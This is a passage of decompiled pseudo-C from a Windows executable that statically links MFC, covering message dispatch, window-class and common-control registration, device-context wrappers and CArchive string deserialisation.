        ((void (__thiscall *)(struct CWnd *, struct CObject *, struct CObject *, struct CObject *))v19)(
          this,
          v37,
          v44,
          v51);
        goto LABEL_96;
      case 49:
        v36 = (__int16)a4;
        v50 = SHIWORD(a4);
LABEL_88:
        ((void (__thiscall *)(struct CWnd *, WPARAM, int, unsigned int))v19)(this, wParam, v36, v50);
        goto LABEL_96;
      default:
        goto LABEL_96;
    }
  }
  *v12 = a2;
  v12[2] = (unsigned int)v13;
  if ( !v13 )
  {
LABEL_30:
    v12[1] = 0;
    AfxUnlockGlobals(7);
    return 0;
  }
  while ( v10 < 0xC000 )
  {
    v15 = (_DWORD *)unknown_libname_24(v13[1], v10, 0, 0);
    v64 = v15;
    if ( v15 )
    {
      v12[1] = (unsigned int)v15;
      AfxUnlockGlobals(7);
      v14 = v64;
      goto LABEL_33;
    }
LABEL_29:
    v59 = (int *)*v59;
    if ( !v59 )
      goto LABEL_30;
    v13 = v59;
    v10 = a2;
  }
  v16 = (_DWORD **)unknown_libname_24(v13[1], 49152, 0, 0);
  v65 = v16;
  if ( !v16 )
    goto LABEL_29;
  while ( *v16[4] != a2 )
  {
    v65 = (_DWORD **)unknown_libname_24(v16 + 6, 49152, 0, 0);
    if ( !v65 )
      goto LABEL_29;
    v16 = v65;
  }
  v12[1] = (unsigned int)v16;
  AfxUnlockGlobals(7);
  v14 = v65;
LABEL_93:
  v19 = (int (__thiscall *)(struct CWnd *, struct CObject *))v14[5];
LABEL_94:
  v23 = ((int (__thiscall *)(struct CWnd *, WPARAM, unsigned int))v19)(this, wParam, a4);
LABEL_95:
  v60 = v23;
LABEL_96:
  if ( a5 )
    *a5 = v60;
  return 1;
}
// 4194B4: using guessed type _DWORD __stdcall unknown_libname_24(_DWORD, _DWORD, _DWORD, _DWORD);
// 443C90: using guessed type int dword_443C90[1536];
// 419538: using guessed type _DWORD var_60[7];

//----- (00419AAA) --------------------------------------------------------
CCmdUI *__thiscall sub_419AAA(CCmdUI *this)
{
  CCmdUI::CCmdUI(this);
  *(_DWORD *)this = &CTestCmdUI::`vftable';
  *((_DWORD *)this + 10) = 1;
  return this;
}
// 420E30: using guessed type void *CTestCmdUI::`vftable';

//----- (00419BDD) --------------------------------------------------------
HWND *__thiscall sub_419BDD(HWND *this)
{
  HWND i; // eax
  HWND *v2; // esi

  if ( this && this[7] )
  {
    for ( i = GetParent(this[7]); ; i = GetParent(v2[7]) )
    {
      v2 = (HWND *)sub_41878D(i);
      if ( !v2 )
        break;
      if ( (*((int (__thiscall **)(HWND *))*v2 + 44))(v2) )
        return v2;
    }
  }
  return 0;
}

//----- (00419C60) --------------------------------------------------------
struct CObject *__thiscall sub_419C60(_DWORD *this)
{
  HWND ParentOwner; // eax
  HWND v3; // esi

  if ( !this )
    return 0;
  ParentOwner = (HWND)this[7];
  if ( !ParentOwner )
    return 0;
  do
  {
    v3 = ParentOwner;
    ParentOwner = AfxGetParentOwner(ParentOwner);
  }
  while ( ParentOwner );
  return sub_41878D(v3);
}

//----- (00419C88) --------------------------------------------------------
HWND *__thiscall sub_419C88(HWND *this)
{
  HWND *v1; // esi
  HWND *i; // ecx
  HWND *v4; // eax

  v1 = this;
  if ( !this || !this[7] )
    return 0;
  if ( !(*((int (__thiscall **)(HWND *))*this + 44))(this) )
    v1 = sub_419BDD(v1);
  if ( v1 )
  {
    for ( i = v1; ; i = v4 )
    {
      v4 = sub_419BDD(i);
      if ( !v4 )
        break;
      v1 = v4;
    }
  }
  return v1;
}

//----- (00419DEA) --------------------------------------------------------
int __stdcall sub_419DEA(HWND a1, HWND *a2)
{
  HWND i; // esi
  void *v3; // eax

  for ( i = *a2; i; i = GetParent(i) )
  {
    v3 = sub_4187B4(i);
    if ( v3 && (*(int (__thiscall **)(void *, HWND *))(*(_DWORD *)v3 + 144))(v3, a2) )
      return 1;
    if ( i == a1 )
      break;
  }
  return 0;
}

//----- (00419E2C) --------------------------------------------------------
int __thiscall sub_419E2C(void *this, int a2)
{
  struct CNoTrackObject *Data; // eax

  Data = CThreadLocalObject::GetData((CThreadLocalObject *)&unk_443ACC, CThreadLocal<_AFX_THREAD_STATE>::CreateObject);
  return (*(int (__thiscall **)(void *, _DWORD, _DWORD, _DWORD, int))(*(_DWORD *)this + 168))(
           this,
           *((_DWORD *)Data + 14),
           *((_DWORD *)Data + 15),
           *((_DWORD *)Data + 16),
           a2);
}

//----- (00419E59) --------------------------------------------------------
int __stdcall sub_419E59(HWND hWnd, int a2)
{
  struct CHandleMap *v2; // eax
  CMapPtrToPtr *v3; // esi
  void *ValueAt; // eax
  HWND Parent; // eax
  _DWORD *v6; // eax
  int v7; // eax
  void *v8; // esi
  int v9; // eax
  int v10; // esi
  _DWORD v12[15]; // [esp+8h] [ebp-48h] BYREF
  int v13; // [esp+4Ch] [ebp-4h]

  v2 = afxMapHWND(0);
  if ( !v2 )
    return 0;
  v3 = (struct CHandleMap *)((char *)v2 + 4);
  ValueAt = CMapPtrToPtr::GetValueAt((struct CHandleMap *)((char *)v2 + 4), hWnd);
  if ( !ValueAt )
  {
    Parent = GetParent(hWnd);
    v6 = CMapPtrToPtr::GetValueAt(v3, Parent);
    if ( v6 )
    {
      v7 = v6[13];
      if ( v7 )
      {
        v8 = CMapPtrToPtr::GetValueAt((CMapPtrToPtr *)(v7 + 32), hWnd);
        if ( v8 )
        {
          sub_418423(v12, (int)hWnd);
          v13 = 0;
          v12[14] = v8;
          v9 = sub_419E2C(v12, a2);
          v12[7] = 0;
          v13 = -1;
          v10 = v9;
          CWnd::~CWnd((CWnd *)v12);
          return v10;
        }
      }
    }
    return 0;
  }
  return sub_419E2C(ValueAt, a2);
}

//----- (00419F58) --------------------------------------------------------
int __thiscall sub_419F58(struct CWnd *this, unsigned int a2, WPARAM wParam, int a4, _DWORD *a5)
{
  int result; // eax
  int v6; // [esp+4h] [ebp-Ch] BYREF
  _DWORD *Buf1; // [esp+8h] [ebp-8h] BYREF
  unsigned int v8; // [esp+Ch] [ebp-4h]

  if ( a2 > 0x111 )
  {
    if ( a2 < 0x114 || a2 > 0x115 && a2 != 528 )
      goto LABEL_15;
    return sub_419538(this, a2 + 48128, wParam, a4, a5);
  }
  if ( a2 != 273 )
  {
    if ( a2 < 0x2B )
      goto LABEL_15;
    if ( a2 > 0x2F && a2 != 57 )
    {
      if ( a2 == 78 )
      {
        Buf1 = a5;
        v8 = a4;
        return sub_41766E(this, 0, (unsigned __int16)*(_DWORD *)(a4 + 8) | 0xBC4E0000, &Buf1, 0);
      }
LABEL_15:
      if ( a2 < 0x132 )
        return 0;
      if ( a2 > 0x138 )
        return 0;
      v8 = a2 - 306;
      Buf1 = (_DWORD *)wParam;
      result = sub_419538(this, 0xBC19u, 0, (unsigned int)&v6, a5);
      if ( !*a5 )
        return 0;
      return result;
    }
    return sub_419538(this, a2 + 48128, wParam, a4, a5);
  }
  if ( !sub_41766E(this, 0, HIWORD(wParam) | 0xBD110000, 0, 0) )
    return 0;
  result = 1;
  if ( a5 )
    *a5 = 1;
  return result;
}

//----- (0041A5A9) --------------------------------------------------------
HMODULE __stdcall sub_41A5A9(const INITCOMMONCONTROLSEX *a1, int a2)
{
  HMODULE ModuleHandleA; // edi
  HMODULE result; // eax
  HMODULE v4; // ebx
  int v5; // esi
  BOOL (__stdcall *InitCommonControlsEx)(const INITCOMMONCONTROLSEX *); // eax

  ModuleHandleA = GetModuleHandleA("COMCTL32.DLL");
  result = LoadLibraryA("COMCTL32.DLL");
  v4 = result;
  if ( result )
  {
    v5 = 0;
    InitCommonControlsEx = (BOOL (__stdcall *)(const INITCOMMONCONTROLSEX *))GetProcAddress(
                                                                               result,
                                                                               "InitCommonControlsEx");
    if ( InitCommonControlsEx )
    {
      if ( InitCommonControlsEx(a1) )
      {
        v5 = a2;
        if ( !ModuleHandleA )
        {
          InitCommonControls();
          LOWORD(v5) = a2 | 0x3FC0;
        }
      }
    }
    else if ( (a2 & 0x3FC0) == a2 )
    {
      InitCommonControls();
      v5 = 16320;
    }
    FreeLibrary(v4);
    return (HMODULE)v5;
  }
  return result;
}

//----- (0041A620) --------------------------------------------------------
BOOL __stdcall sub_41A620(int a1)
{
  int v2; // esi
  struct AFX_MODULE_STATE *v3; // ecx
  int v4; // eax
  WNDCLASSA WndClass; // [esp+0h] [ebp-34h] BYREF
  INITCOMMONCONTROLSEX v6; // [esp+28h] [ebp-Ch] BYREF
  struct AFX_MODULE_STATE *ModuleState; // [esp+30h] [ebp-4h]
  int v8; // [esp+3Ch] [ebp+8h]

  ModuleState = AfxGetModuleState();
  v8 = ~*((_DWORD *)ModuleState + 6) & a1;
  if ( !v8 )
    return 1;
  v2 = 0;
  memset(&WndClass, 0, sizeof(WndClass));
  WndClass.lpfnWndProc = DefWindowProcA;
  WndClass.hInstance = (HINSTANCE)*((_DWORD *)AfxGetModuleState() + 2);
  WndClass.hCursor = (HCURSOR)dword_445810;
  v6.dwSize = 8;
  if ( (v8 & 1) != 0 )
  {
    WndClass.style = 11;
    WndClass.lpszClassName = "AfxWnd42s";
    v2 = sub_4192E5(&WndClass) != 0;
  }
  if ( (v8 & 0x20) != 0 )
  {
    LOBYTE(WndClass.style) |= 0x8Bu;
    WndClass.lpszClassName = "AfxOleControl42s";
    if ( sub_4192E5(&WndClass) )
      v2 |= 0x20u;
  }
  if ( (v8 & 2) != 0 )
  {
    WndClass.style = 0;
    WndClass.lpszClassName = "AfxControlBar42s";
    WndClass.hbrBackground = (HBRUSH)16;
    if ( sub_4192E5(&WndClass) )
      v2 |= 2u;
  }
  if ( (v8 & 4) != 0 )
  {
    WndClass.style = 8;
    WndClass.hbrBackground = 0;
    if ( unknown_libname_30(&WndClass, (int)"AfxMDIFrame42s", 31233) )
      v2 |= 4u;
  }
  if ( (v8 & 8) != 0 )
  {
    WndClass.style = 11;
    WndClass.hbrBackground = (HBRUSH)6;
    if ( unknown_libname_30(&WndClass, (int)"AfxFrameOrView42s", 31234) )
      v2 |= 8u;
  }
  if ( (v8 & 0x10) != 0 )
  {
    v6.dwICC = 255;
    v2 |= (unsigned int)sub_41A5A9(&v6, 16320);
    LOWORD(v8) = v8 & 0xC03F;
  }
  if ( (v8 & 0x40) != 0 )
  {
    v6.dwICC = 16;
    v2 |= (unsigned int)sub_41A5A9(&v6, 64);
  }
  if ( (v8 & 0x80u) != 0 )
  {
    v6.dwICC = 2;
    v2 |= (unsigned int)sub_41A5A9(&v6, 128);
  }
  if ( (v8 & 0x100) != 0 )
  {
    v6.dwICC = 8;
    v2 |= (unsigned int)sub_41A5A9(&v6, 256);
  }
  if ( (v8 & 0x200) != 0 )
  {
    v6.dwICC = 32;
    v2 |= (unsigned int)sub_41A5A9(&v6, 512);
  }
  if ( (v8 & 0x400) != 0 )
  {
    v6.dwICC = 1;
    v2 |= (unsigned int)sub_41A5A9(&v6, 1024);
  }
  if ( (v8 & 0x800) != 0 )
  {
    v6.dwICC = 64;
    v2 |= (unsigned int)sub_41A5A9(&v6, 2048);
  }
  if ( (v8 & 0x1000) != 0 )
  {
    v6.dwICC = 4;
    v2 |= (unsigned int)sub_41A5A9(&v6, 4096);
  }
  if ( (v8 & 0x2000) != 0 )
  {
    v6.dwICC = 128;
    v2 |= (unsigned int)sub_41A5A9(&v6, 0x2000);
  }
  if ( (v8 & 0x4000) != 0 )
  {
    v6.dwICC = 2048;
    v2 |= (unsigned int)sub_41A5A9(&v6, 0x4000);
  }
  if ( (v8 & 0x8000) != 0 )
  {
    v6.dwICC = 1024;
    v2 |= (unsigned int)sub_41A5A9(&v6, 0x8000);
  }
  if ( (v8 & 0x10000) != 0 )
  {
    v6.dwICC = 512;
    v2 |= (unsigned int)sub_41A5A9(&v6, 0x10000);
  }
  if ( (v8 & 0x20000) != 0 )
  {
    v6.dwICC = 256;
    v2 |= (unsigned int)sub_41A5A9(&v6, 0x20000);
  }
  v3 = ModuleState;
  *((_DWORD *)ModuleState + 6) |= v2;
  v4 = *((_DWORD *)v3 + 6);
  if ( (v4 & 0x3FC0) == 16320 )
  {
    LOBYTE(v4) = v4 | 0x10;
    v2 |= 0x10u;
    *((_DWORD *)v3 + 6) = v4;
  }
  return v8 == (v8 & v2);
}
// 445810: using guessed type int dword_445810;

//----- (0041A8D7) --------------------------------------------------------
int sub_41A8D7()
{
  return 0;
}

//----- (0041A8F9) --------------------------------------------------------
void __cdecl sub_41A8F9(_DWORD *a1)
{
  sub_40AF44((int)&unk_445490, a1);
}

//----- (0041AA58) --------------------------------------------------------
BOOL __stdcall sub_41AA58(size_t Size)
{
  struct AFX_MODULE_THREAD_STATE *ModuleThreadState; // ebx
  int v2; // eax
  int v3; // eax
  struct CWinThread *Thread; // eax
  void (__stdcall *v5)(_DWORD, _DWORD); // eax
  int v6; // edi
  struct CNoTrackObject *Data; // eax
  struct CNoTrackObject *v8; // esi
  _DWORD *v9; // eax
  void *v10; // eax
  SIZE_T Sizea; // [esp+14h] [ebp+8h]

  ModuleThreadState = AfxGetModuleThreadState();
  v2 = *((_DWORD *)ModuleThreadState + 4);
  if ( v2 )
  {
    v3 = v2 - 1;
    *((_DWORD *)ModuleThreadState + 4) = v3;
    if ( !v3 )
    {
      if ( Size )
      {
        if ( Size != -1 )
        {
          Thread = AfxGetThread();
          if ( Thread )
          {
            v5 = (void (__stdcall *)(_DWORD, _DWORD))*((_DWORD *)Thread + 21);
            if ( v5 )
              v5(0, 0);
          }
        }
        sub_41AC76(*((_DWORD *)ModuleThreadState + 8));
        sub_41AC76(*((_DWORD *)ModuleThreadState + 7));
        sub_41AC76(*((_DWORD *)ModuleThreadState + 6));
        sub_41AC76(*((_DWORD *)ModuleThreadState + 5));
        sub_41AC76(*((_DWORD *)ModuleThreadState + 9));
      }
      v6 = *((_DWORD *)AfxGetModuleState() + 1);
      Data = CThreadLocalObject::GetData(
               (CThreadLocalObject *)&unk_443ACC,
               CThreadLocal<_AFX_THREAD_STATE>::CreateObject);
      v8 = Data;
      if ( v6
        && (!*((_DWORD *)Data + 3) || sub_40E6FD(*((_DWORD **)Data + 3)) < *(_DWORD *)(v6 + 184))
        && *(_DWORD *)(v6 + 184) )
      {
        v9 = (_DWORD *)*((_DWORD *)v8 + 3);
        Sizea = 0;
        if ( v9 )
        {
          Sizea = sub_40E6FD(v9);
          sub_40B886(*((LPVOID *)v8 + 3));
        }
        v10 = malloc(*(_DWORD *)(v6 + 184));
        *((_DWORD *)v8 + 3) = v10;
        if ( !v10 && Sizea )
          *((_DWORD *)v8 + 3) = malloc(Sizea);
      }
    }
  }
  return *((_DWORD *)ModuleThreadState + 4) != 0;
}
// 41AC76: using guessed type int __thiscall sub_41AC76(_DWORD);

//----- (0041AB52) --------------------------------------------------------
_DWORD *__thiscall sub_41AB52(_DWORD *this, int a2, int a3, int a4)
{
  sub_416AD8(this + 1, 10);
  sub_416AD8(this + 8, 4);
  *this = &CHandleMap::`vftable';
  sub_416B1B((int)(this + 8), 7, 0);
  this[15] = a2;
  this[16] = a3;
  this[17] = a4;
  return this;
}
// 420F28: using guessed type void *CHandleMap::`vftable';

//----- (0041AD4D) --------------------------------------------------------
struct CObject *__stdcall sub_41AD4D(void *a1)
{
  CHandleMap *v1; // eax

  v1 = afxMapHMENU((LPVOID)1);
  return CHandleMap::FromHandle(v1, a1);
}

//----- (0041AD62) --------------------------------------------------------
void *__stdcall sub_41AD62(void *a1)
{
  struct CHandleMap *v1; // ecx
  void *result; // eax

  v1 = afxMapHMENU(0);
  result = 0;
  if ( v1 )
    return CMapPtrToPtr::GetValueAt((struct CHandleMap *)((char *)v1 + 4), a1);
  return result;
}

//----- (0041AD80) --------------------------------------------------------
unsigned int __thiscall sub_41AD80(unsigned int *this)
{
  unsigned int v2; // edi
  struct CHandleMap *v3; // eax

  v2 = this[1];
  if ( v2 )
  {
    v3 = afxMapHMENU(0);
    if ( v3 )
      sub_416CCF((_DWORD *)v3 + 1, this[1]);
  }
  this[1] = 0;
  return v2;
}

//----- (0041ADAA) --------------------------------------------------------
BOOL __thiscall sub_41ADAA(unsigned int *this)
{
  HMENU v2; // eax

  if ( !this[1] )
    return 0;
  v2 = (HMENU)sub_41AD80(this);
  return DestroyMenu(v2);
}

//----- (0041ADC0) --------------------------------------------------------
int __stdcall sub_41ADC0(int a1, int a2, int a3, int a4)
{
  int v4; // ebx
  struct CWinThread *Thread; // esi
  int v6; // edi
  int v7; // ecx
  int v8; // eax

  v4 = -1;
  Thread = AfxGetThread();
  v6 = *((_DWORD *)AfxGetModuleState() + 1);
  if ( sub_41D9C3(a1, a2, a3, a4) && (!v6 || (*(int (__thiscall **)(int))(*(_DWORD *)v6 + 132))(v6)) )
  {
    if ( (*(int (__thiscall **)(struct CWinThread *))(*(_DWORD *)Thread + 80))(Thread) )
    {
      v8 = (*(int (__thiscall **)(struct CWinThread *))(*(_DWORD *)Thread + 84))(Thread);
    }
    else
    {
      v7 = *((_DWORD *)Thread + 7);
      if ( v7 )
        (*(void (__thiscall **)(int))(*(_DWORD *)v7 + 88))(v7);
      v8 = (*(int (__thiscall **)(struct CWinThread *))(*(_DWORD *)Thread + 104))(Thread);
    }
    v4 = v8;
  }
  AfxWinTerm();
  return v4;
}
// 41D9C3: using guessed type _DWORD __stdcall sub_41D9C3(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0041AE5D) --------------------------------------------------------
unsigned int *__thiscall sub_41AE5D(unsigned int *lpMem, char a2)
{
  sub_41AF31(lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (0041AEEB) --------------------------------------------------------
struct CObject *__stdcall sub_41AEEB(void *a1)
{
  CHandleMap *v1; // eax

  v1 = afxMapHDC((LPVOID)1);
  return CHandleMap::FromHandle(v1, a1);
}

//----- (0041AF00) --------------------------------------------------------
unsigned int __thiscall sub_41AF00(unsigned int *this)
{
  unsigned int v2; // edi
  struct CHandleMap *v3; // eax

  v2 = this[1];
  if ( v2 )
  {
    v3 = afxMapHDC(0);
    if ( v3 )
      sub_416CCF((_DWORD *)v3 + 1, this[1]);
  }
  (*(void (__thiscall **)(unsigned int *))(*this + 20))(this);
  this[1] = 0;
  return v2;
}

//----- (0041AF31) --------------------------------------------------------
void *__thiscall sub_41AF31(unsigned int *this)
{
  void *result; // eax
  HDC v2; // eax

  result = &loc_41E504;
  *this = (unsigned int)&off_420630;
  if ( this[1] )
  {
    v2 = (HDC)sub_41AF00(this);
    return (void *)DeleteDC(v2);
  }
  return result;
}
// 420630: using guessed type int (*off_420630)();

//----- (0041AF85) --------------------------------------------------------
int __thiscall sub_41AF85(HDC *this)
{
  int v2; // ebx

  v2 = 0;
  if ( this[2] )
    v2 = SaveDC(this[2]);
  if ( this[1] != this[2] && SaveDC(this[1]) )
    return -1;
  return v2;
}

//----- (0041AFF4) --------------------------------------------------------
struct CObject *__thiscall sub_41AFF4(_DWORD *this, int i)
{
  HGDIOBJ StockObject; // eax
  HDC v4; // ecx
  void *v5; // ebx
  HGDIOBJ v6; // eax
  HDC v7; // esi

  StockObject = GetStockObject(i);
  v4 = (HDC)this[1];
  v5 = StockObject;
  v6 = 0;
  if ( v4 != (HDC)this[2] )
    v6 = SelectObject(v4, v5);
  v7 = (HDC)this[2];
  if ( v7 )
    v6 = SelectObject(v7, v5);
  return sub_41B364(v6);
}

//----- (0041B030) --------------------------------------------------------
struct CObject *__thiscall sub_41B030(_DWORD *this, int a2)
{
  HGDIOBJ v3; // eax
  HDC v4; // ecx
  HDC v5; // esi
  void *v6; // eax

  v3 = 0;
  v4 = (HDC)this[1];
  if ( v4 != (HDC)this[2] )
  {
    if ( a2 )
      v3 = *(HGDIOBJ *)(a2 + 4);
    v3 = SelectObject(v4, v3);
  }
  v5 = (HDC)this[2];
  if ( v5 )
  {
    if ( a2 )
      v6 = *(void **)(a2 + 4);
    else
      v6 = 0;
    v3 = SelectObject(v5, v6);
  }
  return sub_41B364(v3);
}

//----- (0041B076) --------------------------------------------------------
int __thiscall sub_41B076(_DWORD *this, COLORREF color)
{
  int result; // eax
  HDC v4; // ecx
  HDC v5; // esi

  result = -1;
  v4 = (HDC)this[1];
  if ( v4 != (HDC)this[2] )
    result = SetBkColor(v4, color);
  v5 = (HDC)this[2];
  if ( v5 )
    return SetBkColor(v5, color);
  return result;
}

//----- (0041B0A5) --------------------------------------------------------
int __thiscall sub_41B0A5(_DWORD *this, COLORREF color)
{
  int result; // eax
  HDC v4; // ecx
  HDC v5; // esi

  result = -1;
  v4 = (HDC)this[1];
  if ( v4 != (HDC)this[2] )
    result = SetTextColor(v4, color);
  v5 = (HDC)this[2];
  if ( v5 )
    return SetTextColor(v5, color);
  return result;
}

//----- (0041B0D4) --------------------------------------------------------
int __thiscall sub_41B0D4(_DWORD *this, int iMode)
{
  int result; // eax
  HDC v4; // ecx
  HDC v5; // esi

  result = 0;
  v4 = (HDC)this[1];
  if ( v4 != (HDC)this[2] )
    result = SetMapMode(v4, iMode);
  v5 = (HDC)this[2];
  if ( v5 )
    return SetMapMode(v5, iMode);
  return result;
}

//----- (0041B2E2) --------------------------------------------------------
int __thiscall sub_41B2E2(HDC *this, LPRECT lprect)
{
  return GetClipBox(this[1], lprect);
}

//----- (0041B364) --------------------------------------------------------
struct CObject *__stdcall sub_41B364(void *a1)
{
  CHandleMap *v1; // eax

  v1 = afxMapHGDIOBJ((LPVOID)1);
  return CHandleMap::FromHandle(v1, a1);
}

//----- (0041B379) --------------------------------------------------------
unsigned int __thiscall sub_41B379(unsigned int *this)
{
  unsigned int v2; // edi
  struct CHandleMap *v3; // eax

  v2 = this[1];
  if ( v2 )
  {
    v3 = afxMapHGDIOBJ(0);
    if ( v3 )
      sub_416CCF((_DWORD *)v3 + 1, this[1]);
  }
  this[1] = 0;
  return v2;
}

//----- (0041B3A3) --------------------------------------------------------
BOOL __thiscall sub_41B3A3(unsigned int *this)
{
  void *v2; // eax

  if ( !this[1] )
    return 0;
  v2 = (void *)sub_41B379(this);
  return DeleteObject(v2);
}

//----- (0041B3B9) --------------------------------------------------------
CArchive *__stdcall sub_41B3B9(CArchive *a1, const void **a2)
{
  int v2; // edx

  v2 = *((_DWORD *)*a2 - 2);
  if ( v2 >= 255 )
  {
    if ( v2 >= 65534 )
    {
      CArchive::operator<<(255);
      CArchive::operator<<(0xFFFF);
      sub_40A98A(*((_DWORD *)*a2 - 2));
    }
    else
    {
      CArchive::operator<<(255);
      CArchive::operator<<(*((_WORD *)*a2 - 4));
    }
  }
  else
  {
    CArchive::operator<<(*((_DWORD *)*a2 - 2));
  }
  CArchive::Write(a1, *a2, *((_DWORD *)*a2 - 2));
  return a1;
}
// 40A940: using guessed type _DWORD __stdcall CArchive::operator<<(char);
// 40A963: using guessed type _DWORD __stdcall CArchive::operator<<(__int16);
// 40A98A: using guessed type _DWORD __stdcall sub_40A98A(_DWORD);

//----- (0041B489) --------------------------------------------------------
struct CArchive *__stdcall sub_41B489(struct CArchive *a1, CString *a2)
{
  int v2; // ebx
  unsigned int v3; // esi
  wchar_t *v4; // esi
  wchar_t *v6; // [esp-4h] [ebp-14h]
  unsigned int StringLength; // [esp+Ch] [ebp-4h]

  v2 = 0;
  StringLength = ReadStringLength(a1);
  if ( StringLength == -1 )
  {
    v2 = 1;
    StringLength = ReadStringLength(a1);
  }
  v3 = StringLength * (v2 + 1);
  if ( StringLength )
  {
    CString::GetBufferSetLength(a2, v3 + v2);
    if ( sub_41B521((int)a1, *(char **)a2, v3) != v3 )
      sub_41B8FC(3, 0);
    if ( v2 )
    {
      v6 = *(wchar_t **)a2;
      v6[StringLength] = 0;
      *(_DWORD *)a2 = off_4276D4;
      v4 = v6 - 6;
      CString::operator=(a2, v6);
      sub_417BA1(v4);
    }
  }
  else
  {
    CString::GetBufferSetLength(a2, 0);
  }
  return a1;
}
// 4276D4: using guessed type void *off_4276D4;

//----- (0041B521) --------------------------------------------------------
unsigned int __thiscall sub_41B521(int this, char *a2, unsigned int a3)
{
  const void *v5; // eax
  size_t v6; // edi
  unsigned int v7; // ebx
  unsigned int v8; // edi
  int v9; // eax
  unsigned int v10; // edi
  int v11; // eax
  char *v12; // eax
  size_t v13; // edi
  int v14; // [esp+8h] [ebp-8h]
  int v15; // [esp+8h] [ebp-8h]
  unsigned int v16; // [esp+Ch] [ebp-4h]
  unsigned int v17; // [esp+Ch] [ebp-4h]
  char *v18; // [esp+18h] [ebp+8h]

  if ( !a3 )
    return 0;
  v5 = *(const void **)(this + 36);
  v6 = *(_DWORD *)(this + 40) - (_DWORD)v5;
  if ( a3 < v6 )
    v6 = a3;
  memcpy_0(a2, v5, v6);
  *(_DWORD *)(this + 36) += v6;
  v18 = &a2[v6];
  v7 = a3 - v6;
  if ( a3 != v6 )
  {
    v8 = v7 - v7 % *(_DWORD *)(this + 28);
    v14 = 0;
    v16 = v8;
    do
    {
      v9 = (*(int (__thiscall **)(_DWORD, char *, unsigned int))(**(_DWORD **)(this + 32) + 52))(
             *(_DWORD *)(this + 32),
             v18,
             v16);
      v18 += v9;
      v14 += v9;
      v16 -= v9;
    }
    while ( v9 && v16 );
    v7 -= v14;
    if ( v14 == v8 )
    {
      v10 = 0;
      if ( *(_DWORD *)(this + 8) )
      {
        (*(void (__thiscall **)(_DWORD, _DWORD, _DWORD, int, int))(**(_DWORD **)(this + 32) + 80))(
          *(_DWORD *)(this + 32),
          0,
          *(_DWORD *)(this + 28),
          this + 44,
          this + 40);
        v12 = *(char **)(this + 44);
        *(_DWORD *)(this + 36) = v12;
      }
      else
      {
        v17 = v7;
        if ( v7 <= *(_DWORD *)(this + 28) )
          v17 = *(_DWORD *)(this + 28);
        v15 = *(_DWORD *)(this + 44);
        do
        {
          v11 = (*(int (__thiscall **)(_DWORD, int, unsigned int))(**(_DWORD **)(this + 32) + 52))(
                  *(_DWORD *)(this + 32),
                  v15,
                  v17);
          v15 += v11;
          v17 -= v11;
          v10 += v11;
        }
        while ( v11 && v17 && v10 < v7 );
        v12 = *(char **)(this + 44);
        *(_DWORD *)(this + 36) = v12;
        *(_DWORD *)(this + 40) = &v12[v10];
      }
      v13 = *(_DWORD *)(this + 40) - (_DWORD)v12;
      if ( v7 < v13 )
        v13 = v7;
      memcpy_0(v18, v12, v13);
      *(_DWORD *)(this + 36) += v13;
      v7 -= v13;
    }
  }
  return a3 - v7;
}

//----- (0041B6C0) --------------------------------------------------------
int __thiscall sub_41B6C0(int this)
{
  int v2; // edx
  int v3; // eax
  int result; // eax
  int v5; // eax
  int v6; // edx
  int *v7; // edi

  if ( (*(_BYTE *)(this + 20) & 1) != 0 )
  {
    v2 = *(_DWORD *)(this + 40);
    v3 = *(_DWORD *)(this + 36);
    if ( v2 != v3 )
      (*(void (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 32) + 40))(*(_DWORD *)(this + 32), v3 - v2, 1);
    result = *(_DWORD *)(this + 40);
    *(_DWORD *)(this + 36) = result;
  }
  else
  {
    v5 = *(_DWORD *)(this + 36);
    v6 = *(_DWORD *)(this + 44);
    v7 = (int *)(this + 44);
    if ( *(_DWORD *)(this + 8) )
    {
      if ( v5 != v6 )
        (*(void (__stdcall **)(int, int, _DWORD, _DWORD))(**(_DWORD **)(this + 32) + 80))(2, v5 - v6, 0, 0);
      (*(void (__thiscall **)(_DWORD, int, _DWORD, int, int))(**(_DWORD **)(this + 32) + 80))(
        *(_DWORD *)(this + 32),
        1,
        *(_DWORD *)(this + 28),
        this + 44,
        this + 40);
    }
    else if ( v5 != v6 )
    {
      (*(void (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 32) + 56))(*(_DWORD *)(this + 32), v6, v5 - v6);
    }
    result = *v7;
    *(_DWORD *)(this + 36) = *v7;
  }
  return result;
}

//----- (0041B85C) --------------------------------------------------------
int __thiscall sub_41B85C(int this, LPSTR lpString1, int iMaxLength, char *a4)
{
  LPCSTR lpString2; // [esp+8h] [ebp-10h] BYREF
  int v7; // [esp+14h] [ebp-4h]

  if ( a4 )
    *(_DWORD *)a4 = *(_DWORD *)(this + 8) + 61872;
  lpString2 = (LPCSTR)off_4276D4;
  v7 = 1;
  sub_417A27((CString *)&a4, (LPCSTR *)(this + 12));
  if ( !*((_DWORD *)a4 - 2) )
    CString::LoadStringA((CString *)&a4, 0xF006u);
  sub_41C01E((struct CString *)&lpString2, *(_DWORD *)(this + 8) + 61872, a4);
  lstrcpynA(lpString1, lpString2, iMaxLength);
  LOBYTE(v7) = 0;
  sub_417CB2(&a4);
  v7 = -1;
  sub_417CB2(&lpString2);
  return 1;
}
// 4276D4: using guessed type void *off_4276D4;

//----- (0041B8FC) --------------------------------------------------------
void __stdcall __noreturn sub_41B8FC(int a1, LPCSTR lpString)
{
  CException *v2; // eax
  CException *v3; // esi
  CException *pExceptionObject; // [esp+8h] [ebp-10h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  v2 = (CException *)sub_4179F3(0x10u);
  v3 = v2;
  v5 = 0;
  if ( v2 )
  {
    CException::CException(v2);
    *((_DWORD *)v3 + 3) = off_4276D4;
    LOBYTE(v5) = 2;
    *(_DWORD *)v3 = &CArchiveException::`vftable';
    *((_DWORD *)v3 + 2) = a1;
    CString::operator=((CException *)((char *)v3 + 12), lpString);
  }
  else
  {
    v3 = 0;
  }
  v5 = -1;
  pExceptionObject = v3;
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI4PAVCArchiveException__);
}
// 420808: using guessed type void *CArchiveException::`vftable';
// 4276D4: using guessed type void *off_4276D4;

//----- (0041BB78) --------------------------------------------------------
int __thiscall sub_41BB78(_DWORD *this)
{
  int v1; // ecx

  v1 = this[32];
  if ( v1 )
    return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 32))(v1);
  else
    return 1;
}

